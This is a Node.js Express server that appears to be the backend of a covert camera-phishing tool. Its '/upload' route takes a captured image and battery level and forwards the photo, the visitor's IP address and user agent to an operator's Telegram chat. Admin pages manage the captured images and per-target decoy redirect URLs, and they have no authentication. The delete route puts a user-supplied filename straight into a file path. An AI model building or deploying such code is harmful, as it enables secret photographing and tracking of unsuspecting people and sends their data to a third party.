const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const request = require('request');
const { Telegraf } = require('telegraf');

const app = express();
const upload = multer({ dest: 'public/static/' });

const TELEGRAM_BOT_TOKEN = 'your-telegram-bot-token';
const TELEGRAM_CHAT_ID = 'your-telegram-chat-id';
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

const REDIRECT_URLS_FILE = 'redirect_urls.txt';

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Ensure the 'static' directory exists
if (!fs.existsSync('public/static')) {
  fs.mkdirSync('public/static');
}

// Function to send photo to Telegram
function sendPhotoToTelegram(photoPath, ip, userAgent, battery) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
  const formData = {
    chat_id: TELEGRAM_CHAT_ID,
    caption: `IP: ${ip}\nUser Agent: ${userAgent}\nBattery: ${battery}%`,
    photo: fs.createReadStream(photoPath),
  };

  request.post({ url, formData }, (err, httpResponse, body) => {
    if (err) {
      console.error('Upload failed:', err);
    } else {
      console.log('Upload successful! Server responded with:', body);
    }
  });
}

// Function to send message to Telegram
function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  request.post(url, { form: { chat_id: TELEGRAM_CHAT_ID, text: message } }, (err, httpResponse, body) => {
    if (err) {
      console.error('Send message failed:', err);
    } else {
      console.log('Send message successful! Server responded with:', body);
    }
  });
}

// Endpoint to handle image upload
app.post('/upload', upload.single('image'), (req, res) => {
  const { battery } = req.body;
  const imageData = req.file;

  if (!imageData) {
    return res.status(400).json({ message: 'No image uploaded' });
  }

  const ip = req.ip;
  const userAgent = req.headers['user-agent'];
  const photoPath = path.join(__dirname, 'public', 'static', imageData.filename);

  sendPhotoToTelegram(photoPath, ip, userAgent, battery);

  res.json({ message: 'Image uploaded and sent to Telegram successfully', filename: imageData.filename });
});

// Serve the main page
app.get('/', (req, res) => {
  const id = req.query.id || 'default';
  const redirectUrl = getRedirectUrlById(id);
  res.render('index', { redirectUrl });
});

// Serve the admin page
app.get('/admin', (req, res) => {
  const imageFiles = fs.readdirSync('public/static').filter(file => file.endsWith('.png'));
  const redirectUrls = getRedirectUrls();
  res.render('admin', { images: imageFiles, redirectUrls });
});

// Handle setting the redirect URLs
app.post('/set_redirect_urls', (req, res) => {
  const ids = req.body.ids;
  const urls = req.body.urls;
  const redirectUrls = {};

  if (Array.isArray(ids) && Array.isArray(urls)) {
    ids.forEach((id, index) => {
      redirectUrls[id] = urls[index];
    });
  } else {
    redirectUrls[ids] = urls;
  }

  setRedirectUrls(redirectUrls);
  res.redirect('/admin');
});

// Serve the lightweight mobile-friendly admin page
app.get('/admin2', (req, res) => {
  const imageFiles = fs.readdirSync('public/static').filter(file => file.endsWith('.png'));
  res.render('admin2', { images: imageFiles });
});

// Endpoint to delete images
app.post('/delete/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(__dirname, 'public/static', filename);

  fs.unlink(filePath, err => {
    if (err) {
      return res.status(500).send(err.message);
    }
    res.redirect('/admin');
  });
});

// Function to get redirect URLs
function getRedirectUrls() {
  if (!fs.existsSync(REDIRECT_URLS_FILE)) {
    return { 'default': 'https://example.com' };
  }
  const data = fs.readFileSync(REDIRECT_URLS_FILE, 'utf-8');
  const urls = data.split('\n').filter(line => line).map(line => line.split(','));
  return Object.fromEntries(urls);
}

// Function to set redirect URLs
function setRedirectUrls(urls) {
  const data = Object.entries(urls).map(([id, url]) => `${id},${url}`).join('\n');
  fs.writeFileSync(REDIRECT_URLS_FILE, data, 'utf-8');
}

// Get the redirect URL for a given ID
function getRedirectUrlById(id) {
  const urls = getRedirectUrls();
  return urls[id] || urls['default'];
}

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
